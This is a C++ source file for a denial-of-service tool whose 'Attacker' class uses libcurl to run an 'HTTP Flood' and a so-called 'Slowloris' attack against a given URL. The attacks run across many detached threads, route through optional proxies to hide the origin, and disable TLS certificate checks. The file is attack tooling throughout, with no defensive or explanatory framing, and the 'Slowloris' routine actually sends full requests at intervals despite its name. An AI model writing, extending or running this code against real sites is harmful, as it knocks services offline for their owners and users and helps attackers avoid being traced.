#include "attacker.h"
#include <curl/curl.h>
#include <thread>
#include <atomic>
#include <iostream>

std::atomic<bool> Attacker::attacking(false);
std::atomic<bool> Attacker::paused(false);

size_t writeCallback(void*, const size_t size, const size_t nmemb, void*) {
    return size * nmemb;
}

void Attacker::httpFlood(const std::string& url, int requests, const ProxyManager& proxy) {
    CURL* curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        if (proxy.isEnabled() && !proxy.getProxy().empty()) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.getProxy().c_str());
        }
        while (attacking && requests--) {
            if (paused) {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                continue;
            }
            const CURLcode res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                std::cout << "Sent request to " << url << std::endl;
            } else {
                std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
            }
        }
        curl_easy_cleanup(curl);
    }
}

void Attacker::slowloris(const std::string& url, const ProxyManager& proxy) {
    CURL* curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        if (proxy.isEnabled() && !proxy.getProxy().empty()) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.getProxy().c_str());
        }
        while (attacking) {
            if (paused) {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                continue;
            }
            const CURLcode res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                std::cout << "Slowloris request to " << url << std::endl;
            } else {
                std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        curl_easy_cleanup(curl);
    }
}

void Attacker::start(const std::string& url, const std::string& type, int threads, int requests, const ProxyManager& proxy) {
    attacking = true;
    paused = false;
    for (int i = 0; i < threads; ++i) {
        if (type == "HTTP Flood") {
            std::thread(httpFlood, url, requests, proxy).detach();
        } else if (type == "Slowloris") {
            std::thread(slowloris, url, proxy).detach();
        }
    }
}

void Attacker::stop() {
    attacking = false;
}

void Attacker::pause() {
    paused = !paused;
}

bool Attacker::isPaused() {
    return paused;
}

bool Attacker::isAttacking() {
    return attacking;
}